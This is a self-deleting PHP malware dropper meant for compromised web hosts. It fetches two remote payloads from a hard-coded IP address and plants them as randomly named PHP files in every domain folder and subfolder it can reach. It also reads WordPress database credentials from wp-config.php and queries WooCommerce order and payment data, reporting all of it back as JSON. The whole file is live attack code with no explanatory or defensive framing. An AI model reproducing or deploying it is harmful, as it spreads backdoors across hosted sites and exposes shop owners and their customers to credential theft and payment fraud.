<?php /*fmr tbylh  xhw x hnc t oy */?><?php
function maindownfunc123($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch , CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE);
    curl_setopt($ch,CURLOPT_TIMEOUT,30);
    $data = curl_exec($ch);
    return $data;
}
function checkfuncmain2134($domain){
    $zones = array(".com",".org",".net",".int",".ac",".ad",".ae",".af",".ag",".ai",".al",".am",".ao",".aq",".ar",".as",".at",".au",".aw",".ax",".az",".ba",".bb",".bd",".be",".bf",".bg",".bh",".bi",".bj",".bm",".bn",".bo",".br",".bs",".bt",".bw",".by",".bz",".ca",".cc",".cd",".cf",".cg",".ch",".ci",".ck",".cl",".cm",".cn",".co",".cr",".cu",".cv",".cw",".cx",".cy",".cz",".de",".dj",".dk",".dm",".do",".dz",".ec",".ee",".eg",".er",".es",".et",".eu",".fi",".fj",".fk",".fm",".fo",".fr",".ga",".gd",".ge",".gf",".gg",".gh",".gi",".gl",".gm",".gn",".gp",".gq",".gr",".gs",".gt",".gu",".gw",".gy",".hk",".hm",".hn",".hr",".ht",".hu",".id",".ie",".il",".im",".in",".io",".iq",".ir",".is",".it",".je",".jm",".jo",".jp",".ke",".kg",".kh",".ki",".km",".kn",".kp",".kr",".kw",".ky",".kz",".la",".lb",".lc",".li",".lk",".lr",".ls",".lt",".lu",".lv",".ly",".ma",".mc",".md",".me",".mg",".mh",".mk",".ml",".mm",".mn",".mo",".mp",".mq",".mr",".ms",".mt",".mu",".mv",".mw",".mx",".my",".mz",".na",".nc",".ne",".nf",".ng",".ni",".nl",".no",".np",".nr",".nu",".nz",".om",".pa",".pe",".pf",".pg",".ph",".pk",".pl",".pm",".pn",".pr",".ps",".pt",".pw",".py",".qa",".re",".ro",".rs",".ru",".rw",".sa",".sb",".sc",".sd",".se",".sg",".sh",".si",".sk",".sl",".sm",".sn",".so",".sr",".ss",".st",".su",".sv",".sx",".sy",".sz",".tc",".td",".tf",".tg",".th",".tj",".tk",".tl",".tm",".tn",".to",".tr",".tt",".tv",".tw",".tz",".ua",".ug",".uk",".us",".uy",".uz",".va",".vc",".ve",".vg",".vi",".vn",".vu",".wf",".ws",".ye",".yt",".za",".zm",".zw",".academy",".accountant",".accountants",".active",".actor",".ads",".adult",".aero",".africa",".agency",".airforce",".amazon",".analytics",".apartments",".app",".archi",".army",".art",".associates",".attorney",".auction",".audible",".audio",".author",".auto",".autos",".aws",".baby",".band",".bank",".bar",".barefoot",".bargains",".baseball",".basketball",".beauty",".beer",".berlin",".best",".bestbuy",".bet",".bible",".bid",".bike",".bingo",".bio",".biz",".black",".blackfriday",".blockbuster",".blog",".blue",".boo",".book",".boots",".bot",".boutique",".box",".broadway",".broker",".build",".builders",".business",".buy",".buzz",".cab",".cafe",".call",".cam",".camera",".camp",".cancerresearch",".capital",".car",".cards",".care",".career",".careers",".cars",".case",".cash",".casino",".catering",".catholic",".center",".cern",".ceo",".cfd",".channel",".chat",".cheap",".christmas",".church",".cipriani",".circle",".city",".claims",".cleaning",".click",".clinic",".clothing",".cloud",".club",".coach",".codes",".coffee",".college",".community",".company",".compare",".computer",".condos",".construction",".consulting",".contact",".contractors",".cooking",".cool",".coop",".country",".coupon",".coupons",".courses",".credit",".creditcard",".cruise",".cricket",".cruises",".dad",".dance",".data",".date",".dating",".day",".deal",".deals",".degree",".delivery",".democrat",".dental",".dentist",".design",".dev",".diamonds",".diet",".digital",".direct",".directory",".discount",".diy",".docs",".doctor",".dog",".domains",".dot",".download",".drive",".duck",".earth",".eat",".eco",".education",".email",".energy",".engineer",".engineering",".edeka",".enterprises",".equipment",".esq",".estate",".events",".exchange",".expert",".exposed",".express",".fail",".faith",".family",".fan",".fans",".farm",".fashion",".fast",".feedback",".film",".final",".finance",".financial",".fire",".fish",".fishing",".fit",".fitness",".flights",".florist",".flowers",".fly",".foo",".food",".foodnetwork",".football",".forsale",".forum",".foundation",".free",".frontdoor",".fun",".fund",".furniture",".futbol",".fyi",".gallery",".game",".games",".garden",".gay",".gdn",".gift",".gifts",".gives",".glass",".global",".gold",".golf",".google",".gop",".graphics",".green",".gripe",".grocery",".group",".guide",".guitars",".guru",".hair",".hangout",".health",".healthcare",".help",".here",".hiphop",".hiv",".hockey",".holdings",".holiday",".homegoods",".homes",".homesense",".horse",".hospital",".host",".hosting",".hot",".hotels",".house",".how",".ice",".icu",".industries",".info",".ing",".ink",".institute[82]",".insurance",".insure",".international",".investments",".jewelry",".jobs",".joy",".kim",".kitchen",".land",".latino",".law",".lawyer",".lease",".legal",".lgbt",".life",".lifeinsurance",".lighting",".like",".limited",".limo",".link",".live",".living",".loan",".loans",".locker",".lol",".lotto",".love",".ltd",".luxury",".makeup",".management",".map",".market",".marketing",".markets",".mba",".med",".media",".meet",".meme",".memorial",".men",".menu",".mint",".mobi",".mobile",".mobily",".moe",".mom",".money",".monster",".mortgage",".motorcycles",".mov",".movie",".museum",".music",".name",".navy",".network",".new",".news",".ngo",".ninja",".now",".ntt",".observer",".off",".org",".one",".ong",".onl",".online",".ooo",".open",".organic",".origins",".page",".partners",".parts",".party",".pay",".pet",".pharmacy",".phone",".photo",".photography",".photos",".physio",".pics",".pictures",".pid",".pin",".pink",".pizza",".place",".plumbing",".plus",".poker",".porn",".post",".press",".prime",".pro",".productions",".prof",".promo",".properties",".property",".protection",".pub",".qpon",".racing",".radio",".read",".realestate",".realtor",".realty",".recipes",".red",".rehab",".reit",".rent",".rentals",".repair",".report",".republican",".rest",".restaurant",".review",".reviews",".rich",".rip",".rocks",".rodeo",".room",".rugby",".run",".safe",".sale",".save",".sbi",".scholarships",".school",".science",".search",".secure",".security",".select",".services",".sex",".sexy",".shoes",".shop",".shopping",".show",".showtime",".silk",".singles",".site",".ski",".skin",".sky",".sling",".smile",".soccer",".social",".software",".solar",".solutions",".song",".space",".spot",".spreadbetting",".storage",".store",".stream",".studio",".study",".style",".sucks",".supplies",".supply",".support",".surf",".surgery",".systems",".talk",".tattoo",".tax",".taxi",".team",".tech",".technology",".tel",".tennis",".theater",".theatre",".tickets",".tips",".tires",".today",".tools",".top",".tours",".town",".toys",".trade",".trading",".training",".travel",".travelersinsurance",".trust",".tube",".tunes",".uconnect",".university",".vacations",".ventures",".vet",".video",".villas",".vip",".vision",".vodka",".vote",".voting",".voyage",".wang",".watch",".watches",".weather",".webcam",".website",".wed",".wedding",".whoswho",".wiki",".win",".wine",".winners",".work",".works",".world",".wow",".wtf",".xxx",".xyz",".yachts",".yoga",".you",".zero",".zone",".ren",".shouji",".tushu",".wanggou",".weibo",".xihuan",".xin",".arte",".clinique",".luxe",".maison",".moi",".rsvp",".sarl",".epost",".gmbh",".haus",".immobilien",".jetzt",".kaufen",".kinder",".reise",".reisen",".schule",".versicherung",".desi",".shiksha",".casa",".immo",".moda",".voto",".bom",".passagens",".abogado",".futbol",".gratis",".hoteles",".juegos",".ltda",".soy",".tienda",".uno",".viajes",".vuelos",".africa",".capetown",".durban",".joburg",".abudhabi",".arab",".asia",".doha",".dubai",".krd",".kyoto",".nagoya",".okinawa",".osaka",".ryukyu",".taipei",".tatar",".tokyo",".yokohama",".alsace",".amsterdam",".bar",".bcn",".barcelona",".bayern",".berlin",".brussels",".budapest",".bzh",".cat",".cologne",".corsica",".cymru",".eus",".frl",".gal",".gent",".hamburg",".helsinki",".irish",".ist",".istanbul",".koeln",".london",".madrid",".moscow",".nrw",".paris",".ruhr",".saarland",".scot",".stockholm",".swiss",".tirol",".vlaanderen",".wales",".wien",".zuerich",".boston",".miami",".nyc",".quebec",".vegas",".kiwi",".melbourne",".sydney",".lat",".rio",".aaa",".aarp",".abarth",".abb",".abbott",".abbvie",".abc",".accenture",".aco",".aeg",".aetna",".afl",".agakhan",".aig",".aigo",".airbus",".airtel",".akdn",".alfaromeo",".alibaba",".alipay",".allfinanz",".allstate",".ally",".alstom",".americanexpress",".amex",".amica",".android",".anz",".aol",".apple",".aquarelle",".aramco",".audi",".auspost",".axa",".azure",".baidu",".bananarepublic",".barclaycard",".barclays",".basketball",".bauhaus",".bbc",".bbt",".bbva",".bcg",".bentley",".bharti",".bing",".blanco",".bloomberg",".bms",".bmw",".bnl",".bnpparibas",".boehringer",".bond",".booking",".bosch",".bostik",".bradesco",".bridgestone",".brother",".bugatti",".cal",".calvinklein",".canon",".capitalone",".caravan",".cartier",".cba",".cbn",".cbre",".cbs",".cern",".cfa",".chanel",".chase",".chintai",".chrome",".chrysler",".cisco",".citadel",".citi",".citic",".clubmed",".comcast",".commbank",".creditunion",".crown",".crs",".csc",".cuisinella",".dabur",".datsun",".dealer",".dell",".deloitte",".delta",".dhl",".discover",".dish",".dnp",".dodge",".dunlop",".dupont",".dvag",".edeka",".emerck",".epson",".ericsson",".erni",".esurance",".etisalat",".eurovision",".everbank",".extraspace",".fage",".fairwinds",".farmers",".fedex",".ferrari",".ferrero",".fiat",".fidelity",".firestone",".firmdale",".flickr",".flir",".flsmidth",".ford",".fox",".fresenius",".forex",".frogans",".frontier",".fujitsu",".fujixerox",".gallo",".gallup",".gap",".gbiz",".gea",".genting",".giving",".gle",".globo",".gmail",".gmo",".gmx",".godaddy",".goldpoint",".goodyear",".goog",".google",".grainger",".guardian",".gucci",".hbo",".hdfc",".hdfcbank",".hermes",".hisamitsu",".hitachi",".hkt",".honda",".honeywell",".hotmail",".hsbc",".hughes",".hyatt",".hyundai",".ibm",".ieee",".ifm",".ikano",".imdb",".infiniti",".intel",".intuit",".ipiranga",".iselect",".itau",".itv",".iveco",".jaguar",".java",".jcb",".jcp",".jeep",".jpmorgan",".juniper",".kddi",".kerryhotels",".kerrylogistics",".kerryproperties",".kfh",".kia",".kinder",".kindle",".komatsu",".kpmg",".kred",".kuokgroup",".lacaixa",".ladbrokes",".lamborghini",".lancaster",".lancia",".lancome",".landrover",".lanxess",".lasalle",".latrobe",".lds",".leclerc",".lego",".liaison",".lexus",".lidl",".lifestyle",".lilly",".lincoln",".linde",".lipsy",".lixil",".locus",".lotte",".lpl",".lplfinancial",".lundbeck",".lupin",".macys",".maif",".man",".mango",".marriott",".maserati",".mattel",".mckinsey",".metlife",".microsoft",".mini",".mit",".mitsubishi",".mlb",".mma",".monash",".mormon",".moto",".movistar",".msd",".mtn",".mtr",".mutual",".nadex",".nationwide",".natura",".nba",".nec",".netflix",".neustar",".newholland",".nexus",".nfl",".nhk",".nico",".nike",".nikon",".nissan",".nissay",".nokia",".northwesternmutual",".norton",".nra",".ntt",".obi",".office",".omega",".oracle",".orange",".otsuka",".ovh",".panasonic",".pccw",".pfizer",".philips",".piaget",".pictet",".ping",".pioneer",".play",".playstation",".pohl",".politie",".praxi",".prod",".progressive",".pru",".prudential",".pwc",".quest",".qvc",".redstone",".reliance",".rexroth",".ricoh",".rmit",".rocher",".rogers",".rwe",".safety",".sakura",".samsung",".sandvik",".sandvikcoromant",".sanofi",".sap",".saxo",".sbi",".sbs",".sca",".scb",".schaeffler",".schmidt",".schwarz",".scjohnson",".scor",".seat",".sener",".ses",".sew",".seven",".sfr",".seek",".shangrila",".sharp",".shaw",".shell",".shriram",".sina",".sky",".skype",".smart",".sncf",".softbank",".sohu",".sony",".spiegel",".stada",".staples",".star",".starhub",".statebank",".statefarm",".statoil",".stc",".stcgroup",".suzuki",".swatch",".swiftcover",".symantec",".taobao",".target",".tatamotors",".tdk",".telecity",".telefonica",".temasek",".teva",".tiffany",".tjx",".toray",".toshiba",".total",".toyota",".travelchannel",".travelers",".tui",".tvs",".ubs",".unicom",".uol",".ups",".vanguard",".verisign",".vig",".viking",".virgin",".visa",".vista",".vistaprint",".vivo",".volkswagen",".volvo",".walmart",".walter",".weatherchannel",".weber",".weir",".williamhill",".windows",".wme",".wolterskluwer",".woodside",".wtc",".xbox",".xerox",".xfinity",".yahoo",".yamaxun",".yandex",".yodobashi",".youtube",".zappos",".zara",".zip",".zippo",".example",".invalid",".local",".localhost",".onion",".test");
    foreach($zones as $item){
        if(strpos(strtolower($domain),$item)!==false and $domain[0]!='.'){
            return true;
        }
    }
    return false;
}
function getDir($path){
    global $woo;
    $d = dir($path);
    $dir = array();
    if($d) {
        while (false !== ($entry = $d->read())) {
            if ($entry == 'wp-config.php') {
                if (is_dir($path . '/wp-content/plugins/woocommerce')) {
                    $orders = checkOrders($path.'/'.$entry);
                    $woo[] = array('orders' => $orders, 'path' => $path . '/' . $entry);
                }
            }
            if (is_dir($path . '/' . $entry) && ($entry != '.') && ($entry != '..')) {
                //if(checkfuncmain2134($entry)){
                $dir[] = array('name' => $entry, 'path' => $path . '/' . $entry);
                //}
            }
        }
        $d->close();
    }
    return $dir;
}
function get_wordpress_data($path) {
    $content = @file_get_contents( $path );
    if( ! $content ) {
        return false;
    }
    $params = [
        'db_name' => "/define.+?'DB_NAME'.+?'(.*?)'.+/",
        'db_user' => "/define.+?'DB_USER'.+?'(.*?)'.+/",
        'db_password' => "/define.+?'DB_PASSWORD'.+?'(.*?)'.+/",
        'db_host' => "/define.+?'DB_HOST'.+?'(.*?)'.+/",
        'table_prefix' => "/table_prefix.+?\=.+?'(.*?)'.+/",
    ];
    $return = [];
    foreach( $params as $key => $value ) {

        $found = preg_match_all( $value, $content, $result );

        if( $found ) {
            $return[ $key ] = $result[ 1 ][ 0 ];
        } else {
            $return[ $key ] = false;
        }

    }

    return $return;
}
function checkOrders($path){
    $config = get_wordpress_data($path);
    $conn = mysqli_connect($config['db_host'], $config['db_user'], $config['db_password'], $config['db_name']);
    $data = array();
    $result = mysqli_query($conn, "Select count(*) from ".$config['table_prefix']."posts where post_type = 'shop_order'");
    while($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }
    $woo['count'] = $data;

    $data = array();
    $result = mysqli_query($conn, "Select * from ".$config['table_prefix']."posts where post_type = 'shop_order' and DATE(post_date)>'2020-10-01' ORDER BY ID ASC");
    while($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }
    $woo['month'] = count($data);
    $firstID = $data[0]['ID'];
    $woo['firsID'] = $firstID;
    $data = array();
    $result = mysqli_query($conn, "Select * from ".$config['table_prefix']."postmeta where post_id > $firstID and meta_key='_payment_method'");
    while($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }

    $payment = array();
    foreach($data as $item){
        $payment[$item['meta_value']]++;
    }
    $woo['payments'] = $payment;

    mysqli_close($conn);
    return $woo;
}
function mainworkfuncdata34325($path,$filename,$payload){
    $d = dir($path);
    $dir = array();
    while (false !== ($entry = $d->read())) {
        if (is_dir($path.'/'.$entry) && ($entry != '.') && ($entry != '..')){
            $dir[] = array('name'=>$entry,'path'=>$path.'/'.$entry);
        }
    }
    $d->close();
    foreach($dir as $item){
        file_put_contents($item['path'].'/'.$filename.'.php','<?php  /*'.md5(time()).md5(time()).'*/ ?>'.$payload);
    }
}
function scandatafoldersmain52432($path){
    $result = array();
    $temp = getDir($path);
    if(!empty($temp)){
        $result = array_merge($result, $temp);
        foreach($temp as $item){
            $temp1Level = getDir($item['path']);
            if(!empty($temp1Level)){
                $result = array_merge($result, $temp1Level);
                foreach($temp1Level as $item2){
                    $temp2Level = getDir($item2['path']);
                    if(!empty($temp2Level)){
                        $result = array_merge($result, $temp2Level);
                        foreach($temp2Level as $item3){
                            $temp3Level = getDir($item3['path']);
                            if(!empty($temp3Level)){
                                $result = array_merge($result, $temp3Level);
                                foreach($temp3Level as $item4){
                                    $temp4Level = getDir($item4['path']);
                                    if(!empty($temp4Level)){
                                        $result = array_merge($result, $temp4Level);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return $result;
}

if($_SERVER['REQUEST_METHOD'] === 'POST'){
    if (isset($_POST["result"])){
        echo 'OKOKOK';
        exit;
    }
}
$result = array();
$woo = array();
$payload = maindownfunc123('http://185.244.150.7/1.txt');
$payload1 = maindownfunc123('http://185.244.150.7/2.txt');

$filename = '';
$chars = "0123456789abcdefghjklmnopqrstuvwxyz";
for ($i = 0; $i < 6; $i++) {
  $filename .= $chars[mt_rand(0, strlen($chars)-1)];
}



if(is_dir($_SERVER["DOCUMENT_ROOT"].'/../..') and is_readable($_SERVER["DOCUMENT_ROOT"].'/../..')){
    $dirCheck = $_SERVER["DOCUMENT_ROOT"].'/../..';
}elseif(is_dir($_SERVER["DOCUMENT_ROOT"].'/..') and is_readable($_SERVER["DOCUMENT_ROOT"].'/..')){
    $dirCheck = $_SERVER["DOCUMENT_ROOT"].'/..';
}else{
    $dirCheck = $_SERVER["DOCUMENT_ROOT"];
}
$resultTemp = scandatafoldersmain52432($dirCheck);
if(!empty($resultTemp)){
    foreach($resultTemp as $item){
        if(checkfuncmain2134($item['name'])){
            $result['links'][$item['name']] = array('name'=>$item['name'],'path'=>$item['path'], 'url'=>'http://'.$item['name'].'/'.$filename.'.php', 'url1'=>'http://'.$item['name'].'/'.$filename.'1.php');
            file_put_contents($item['path'].'/'.$filename.'.php','<?php  /*'.md5(time()).md5(time()).'*/ ?>'.$payload);
            file_put_contents($item['path'].'/'.$filename.'1.php','<?php  /*'.md5(time()).md5(time()).'*/ ?>'.$payload1);
            mainworkfuncdata34325($item['path'],$filename,$payload);
            mainworkfuncdata34325($item['path'],$filename.'1',$payload1);
        }
    }
}

$result['shops'] = $woo;
echo "###"."@@@".json_encode($result)."@@@"."###";

unlink(__FILE__);
